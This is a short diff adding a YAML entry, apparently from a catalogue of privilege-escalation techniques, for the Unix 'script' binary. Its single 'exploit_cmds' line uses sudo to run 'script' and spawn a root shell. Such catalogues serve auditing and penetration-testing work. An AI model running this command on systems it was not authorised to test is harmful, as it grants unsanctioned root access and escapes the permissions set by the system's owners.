@@ -1,0 +1,4 @@
+name: script
+binary_path: /usr/bin/script
+exploit_cmds:
+- sudo /usr/bin/script -q /dev/null
